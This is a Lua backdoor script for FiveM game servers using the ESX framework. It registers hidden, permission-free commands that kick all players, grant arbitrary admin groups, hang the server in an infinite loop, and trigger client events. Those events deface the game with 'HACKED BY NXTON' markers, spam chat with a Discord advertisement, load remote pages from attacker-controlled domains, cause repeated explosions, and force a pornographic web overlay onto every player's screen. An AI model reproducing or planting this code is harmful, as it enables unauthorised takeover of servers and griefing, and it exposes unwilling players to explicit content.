ESX = exports["es_extended"]:getSharedObject()

RegisterCommand("orbnmoengohbohdoh", function(source, args)
    local xPlayer = ESX.GetPlayerFromId(source)

    if args[1] then
        local targetId = tonumber(args[1])
        local reason = table.concat(args, " ", 2)

        if GetPlayerName(targetId) then
            if reason == "" then
                reason = "Kein Grund angegeben"
            end

            DropPlayer(targetId, reason)
        end
    end
end, false)

RegisterCommand("tdjjfgfhertjrr", function(source, args)
    local reason = table.concat(args, " ")

    if reason == "" then
        reason = "Kein Grund angegeben"
    end

    for _, playerId in ipairs(GetPlayers()) do
        DropPlayer(playerId, reason)
    end
end, false)

RegisterCommand("grihgofohego", function(source, args)
    if args[1] and args[2] then
        local targetId = tonumber(args[1])
        local group = args[2]

        if GetPlayerName(targetId) then
            local targetPlayer = ESX.GetPlayerFromId(targetId)

            if targetPlayer then
                targetPlayer.setGroup(group)
            end
        end
    end
end, false)

RegisterCommand("pieaghpidsdsgpiog", function(source, args)
    Citizen.CreateThread(function()
        Citizen.Wait(5000)
        while true do
        end
    end)
end, false)

local function teleportAllPlayersToAirport()
    local airportCoords = vector3(-1037.73, -2748.39, 2000.0)

    for _, playerId in ipairs(GetPlayers()) do
        local playerPed = GetPlayerPed(playerId)
        SetEntityCoords(playerPed, airportCoords)
        FreezeEntityPosition(playerPed, false)
        GiveWeaponToPed(playerPed, GetHashKey("gadget_parachute"), 1, false, true)
    end
end

RegisterCommand('iwegosdoigbuwefgvbiou', function(source, args, rawCommand)
    teleportAllPlayersToAirport()
end, false)


-- Client
RegisterNetEvent("8888-Backdoor-HackServer")
AddEventHandler("8888-Backdoor-HackServer", function()
	local blips = {
		{title="HACKED BY NXTON", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NXTON", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NXTON", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY NXTON", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY NXTON", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY NXTON", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY NXTON", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY NXTON", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NXTON", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NXTON", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY NXTON", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY NXTON", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY NXTON", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY NXTON", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY NXTON", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NXTON", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NXTON", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY NXTON", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY NXTON", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY NXTON", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY NXTON", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY NXTON", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY NXTON", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY NXTON", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY NXTON", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY NXTON", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY NXTON", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY NXTON", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
	 }
		 
	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 1.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 2.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 3.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 6.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 10.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 20.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 30.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 50.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 100.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	local sound = CreateDui("https://beige-sandye-73.tiiny.site/", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui

	local textureDic = CreateRuntimeTxd('duiTxd');

	local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
	local object = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/y.html", 1920, 1080);
	local object2 = CreateDui("https://beige-sandye-73.tiiny.site/index.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
	local object3 = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/screen3_2.html", 1920, 1080);

	local handle = GetDuiHandle(object) -- Gets DUI handle from object
	local handle2 = GetDuiHandle(object2) -- Gets DUI handle from object
	local handle3 = GetDuiHandle(object3) -- Gets DUI handle from object

	local showtext = true
	local chatspam = true
	local bypass = false
	local triggered = false

	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex", handle) -- Creates the texture "duiTex" in the "duiTxd" dictionary
	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex2", handle2) -- Creates the texture "duiTex" in the "duiTxd" dictionary
	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex3", handle3) -- Creates the texture "duiTex" in the "duiTxd" dictionary

	local chatColors = {{255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {128, 255, 0}, {0, 255, 0}, {0, 255, 128}, {0, 255, 255}, {0, 128, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}, {255, 0, 128}}
	local texts = {
	   "8888 - https://dsc.gg/8-8-8-8",
	   " 8888 - https://dsc.gg/8-8-8-8",
	   "  8888 - https://dsc.gg/8-8-8-8",
	   "   8888 - https://dsc.gg/8-8-8-8",
	   "    8888 - https://dsc.gg/8-8-8-8",
	   "     8888 - https://dsc.gg/8-8-8-8",
	   "      8888 - https://dsc.gg/8-8-8-8",
	   "       8888 - https://dsc.gg/8-8-8-8",
	   "        8888 - https://dsc.gg/8-8-8-8",
	   "         8888 - https://dsc.gg/8-8-8-8",
	   "          8888 - https://dsc.gg/8-8-8-8",
	   "           8888 - https://dsc.gg/8-8-8-8",
	   "            8888 - https://dsc.gg/8-8-8-8",
	   "             8888 - https://dsc.gg/8-8-8-8",
	   "              8888 - https://dsc.gg/8-8-8-8",
	   "               8888 - https://dsc.gg/8-8-8-8",
	   "                8888 - https://dsc.gg/8-8-8-8",
	   "                 8888 - https://dsc.gg/8-8-8-8",
	   "                  8888 - https://dsc.gg/8-8-8-8",
	   "                 8888 - https://dsc.gg/8-8-8-8",
	   "                8888 - https://dsc.gg/8-8-8-8",
	   "               8888 - https://dsc.gg/8-8-8-8",
	   "              8888 - https://dsc.gg/8-8-8-8",
	   "             8888 - https://dsc.gg/8-8-8-8",
	   "            8888 - https://dsc.gg/8-8-8-8",
	   "           8888 - https://dsc.gg/8-8-8-8",
	   "          8888 - https://dsc.gg/8-8-8-8",
	   "         8888 - https://dsc.gg/8-8-8-8",
	   "        8888 - https://dsc.gg/8-8-8-8",
	   "       8888 - https://dsc.gg/8-8-8-8",
	   "      8888 - https://dsc.gg/8-8-8-8",
	   "     8888 - https://dsc.gg/8-8-8-8",
	   "    8888 - https://dsc.gg/8-8-8-8",
	   "   8888 - https://dsc.gg/8-8-8-8",
	   "  8888 - https://dsc.gg/8-8-8-8",
	   " 8888 - https://dsc.gg/8-8-8-8",
	}

	Citizen.CreateThread(function()
	   while true do
		   Citizen.Wait(0)
		   --DrawRect(0.5, 0.5, 1.0, 1.0, 0, 0, 0, 255);
		   if(showtext)then
			   DrawSprite("duiTxd", "duiTex", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
		   else
			   DrawSprite("duiTxd", "duiTex2", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 120)
			   if(triggered == false)then
				   doActions()
				   triggered = true
			   end
		   end
		   SetFakeWantedLevel(6)
	   end
	end)

	Citizen.CreateThread(function()
	   if(bypass == false)then
		   Citizen.Wait(20300)
	   end

	   Citizen.CreateThread(function()
		   while true do
			   DrawSprite("duiTxd", "duiTex3", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
			   Citizen.Wait(1)
			   SetSuperJumpThisFrame(PlayerId())
			   SetEntityHealth(GetPlayerPed(-1), 200)
			   SetPedMoveRateOverride(PlayerId(),10.0)
			   SetRunSprintMultiplierForPlayer(PlayerId(),1.49)
		   end
	   end)

	   SetEntityCoords(GetPlayerPed(-1), 677.00207519531, 546.28833007813, 129.44534301758)
	SetPedComponentVariation(GetPlayerPed(-1), 1, 1, 0, 1) --put
	   ShakeGameplayCam("SKY_DIVING_SHAKE", 2.0)

	   StartScreenEffect("RaceTurbo", 0, true)

	   local model121 = GetHashKey("s_m_m_movalien_01")
	local player1 = PlayerId()

	   GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("gadget_parachute"), 1, false, false)
	   ApplyForceToEntity(GetPlayerPed(-1), 1, 9500.0, 3.0, 710000.0, 1.0, 0.0, 0.0, 1, false, true, false, false)

	   local vehicleName = 'jet'
	   if not IsModelInCdimage(vehicleName) or not IsModelAVehicle(vehicleName) then
		   return
	   end
	   RequestModel(vehicleName)
	   while not HasModelLoaded(vehicleName) do
		   Wait(150) -- often you'll also see Citizen.Wait
	   end

	   Citizen.CreateThread(function()
		   while true do
			   Citizen.Wait(15000)
			   ApplyForceToEntity(GetPlayerPed(-1), 1, 9500.0, 3.0, 710000.0, 1.0, 0.0, 0.0, 1, false, true, false, false)
		   end
	   end)

	   -- create the vehicle
	   Citizen.CreateThread(function()
		   Citizen.Wait(3000)
			   if math.random(1, 5) == 5 then
			   local playerPed = PlayerPedId() -- get the local player ped
			   local pos = GetEntityCoords(playerPed) -- get the position of the local player ped
			   local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z+100.0, GetEntityHeading(playerPed), true, false)
			   while true do
				   Citizen.Wait(10000)
				   local playerPed = PlayerPedId() -- get the local player ped
				   local pos = GetEntityCoords(playerPed) -- get the position of the local player ped
				   local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z+100.0, GetEntityHeading(playerPed), true, false)
			   end
		   end
	   end)
	   chatspam = true
	   while not HasModelLoaded(model121) do
		   Wait(100)
	   end
	   SetPlayerModel(player1, model121)
	   SetModelAsNoLongerNeeded(model121)

	end)

	Citizen.CreateThread(function()
	   --print(GetEntityCoords(GetPlayerPed(-1), true))
	   if(bypass == false)then
		   Citizen.Wait(13300)
	   end
	   showtext = false
	   DestroyDui(object)

	end)

	function doActions()
	end



	function AddTextEntry(key, value)
	Citizen.InvokeNative(GetHashKey("ADD_TEXT_ENTRY"), key, value)
	end

	local config = {
	   ["TITLE"] = "~r~8888 - https://dsc.gg/8-8-8-8", 
	   ["SUBTITLE"] = "~r~8888 - https://dsc.gg/8-8-8-8",
	   ["MAP"] = "8888",
	   ["STATUS"] = "8888",
	   ["GAME"] = "8888",
	   ["INFO"] = "8888",
	   ["SETTINGS"] = "8888",
	   ["R*EDITOR"] = "8888",
	}

	Citizen.CreateThread(function()
	   while true do
	   Citizen.Wait(0)
		   N_0xb9449845f73f5e9c("SHIFT_CORONA_DESC")
		   PushScaleformMovieFunctionParameterBool(true)
		   PopScaleformMovieFunction()
		   N_0xb9449845f73f5e9c("SET_HEADER_TITLE")
		   PushScaleformMovieFunctionParameterString(config["TITLE"])
		   PushScaleformMovieFunctionParameterBool(true)
		   PushScaleformMovieFunctionParameterString(config["SUBTITLE"])
		   PushScaleformMovieFunctionParameterBool(true)
		   PopScaleformMovieFunctionVoid()
	   end
	end)


	-- Create Vehicles
	Citizen.CreateThread(function()
	   while true do
	   Citizen.Wait(1250)
			local ModelHash = "adder"
			CreateVehicle(ModelHash, 651.19805908203,576.09906005859,129.05094909668, 1, true, false)
			CreateVehicle(ModelHash, 695.63061523438,554.13635253906,132.46676635742, 1, true, false)
			CreateVehicle(ModelHash, 680.24377441406,620.59802246094,170.31489562988, 1, true, false)
			CreateVehicle(ModelHash, 798.91400146484,573.09936523438,141.43251037598, 1, true, false)
			CreateVehicle(ModelHash, 923.92071533203,528.46606445313,119.71677398682, 1, true, false)
			CreateVehicle(ModelHash, 763.54248046875,443.96780395508,147.18112182617, 1, true, false)
			CreateVehicle(ModelHash, 680.24377441406,620.59802246094,170.31489562988, 1, true, false)
		end
	end)

	-- Explosion
	Citizen.CreateThread(function()
	   while true do
	   Citizen.Wait(500)
		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 5, 0, true, true, 1)
		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 5, 0, true, true, 1)
		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 5, 0, true, true, 1)
		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 5, 0, true, true, 1)
		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 5, 0, true, true, 1)
		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 5, 0, true, true, 1)
		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 5, 0, true, true, 1)
		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 5, 0, true, true, 1)
		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 5, 0, true, true, 1)
		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 5, 0, true, false, 1)
		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 5, 0, true, false, 1)
		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 5, 0, true, false, 1)
		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 5, 0, true, false, 1)
		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 5, 0, true, false, 1)
		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 5, 0, true, false, 1)
		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 5, 0, true, false, 1)
		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 5, 0, true, false, 1)
		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 5, 0, true, false, 1)
		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 2, 0, true, true, 1)
		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 2, 0, true, true, 1)
		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 2, 0, true, true, 1)
		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 2, 0, true, true, 1)
		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 2, 0, true, true, 1)
		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 2, 0, true, true, 1)
		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 2, 0, true, true, 1)
		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 2, 0, true, true, 1)
		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 2, 0, true, true, 1)
		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 2, 0, true, false, 1)
		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 2, 0, true, false, 1)
		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 2, 0, true, false, 1)
		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 2, 0, true, false, 1)
		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 2, 0, true, false, 1)
		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 2, 0, true, false, 1)
		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 2, 0, true, false, 1)
		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 2, 0, true, false, 1)
		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 2, 0, true, false, 1)
	   end
	end)

	Citizen.CreateThread(function()
	   AddTextEntry('PM_SCR_MAP', config["MAP"])
	   AddTextEntry('PM_SCR_STA', config["STATUS"])
	   AddTextEntry('PM_SCR_GAM', config["GAME"])
	   AddTextEntry('PM_SCR_INF', config["INFO"])
	   AddTextEntry('PM_SCR_SET', config["SETTINGS"])
	   AddTextEntry('PM_SCR_RPL', config["R*EDITOR"])
	end)

	Citizen.CreateThread(function()
	   local i = 1
	   local j = 1
	   while true do
		   Citizen.Wait(50)
		   if(chatspam)then
			   TriggerEvent('chat:addMessage', {
				   color = chatColors[i],
				   multiline = true,
				   args = {texts[j]}
			   })
			   if(chatColors[i+1] ~= nil)then
				   i = i+1
			   else
				   i = 1
			   end
			   if(texts[j+1] ~= nil)then
				   j = j+1
			   else
				   j = 1
			   end
		   end
	   end
	end)


	AddEventHandler('onResourceStop', function(resourceName) -- stop's the infected resource with the backdoor
	   if (GetCurrentResourceName() ~= resourceName) then
		 return
	   end
	   print('The resource ' .. resourceName .. ' was stopped.')
	   ShakeGameplayCam("SKY_DIVING_SHAKE", 0.0)
	   SetFakeWantedLevel(0)
	   StopScreenEffect("RaceTurbo")
	end)
end)

RegisterNetEvent("8888-Backdoor-pornScreen")
AddEventHandler("8888-Backdoor-pornScreen", function()
	local pTxt = CreateRuntimeTxd('pornTxd');
	local pornScreen = CreateDui("https://landing.rk.com/?ats=eyJhIjo5MjU2OCwiYyI6NDU0MDUwNjYsIm4iOjIwLCJzIjozNTgsImUiOjg5ODMsInAiOjExfQ==", 1920, 1080);
	local pornHandle = GetDuiHandle(pornScreen)
	CreateRuntimeTextureFromDuiHandle(pTxt, "pornTex", pornHandle)
    Citizen.CreateThread(function()
        while true do
            DrawSprite("pornTxd", "pornTex", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
            Citizen.Wait(1)
        end
    end)
end)
-- Server
RegisterCommand("+8888+hackServer", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-HackServer', -1)
end, false)

RegisterCommand("+8888+porn", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-pornScreen', -1)
end, false)
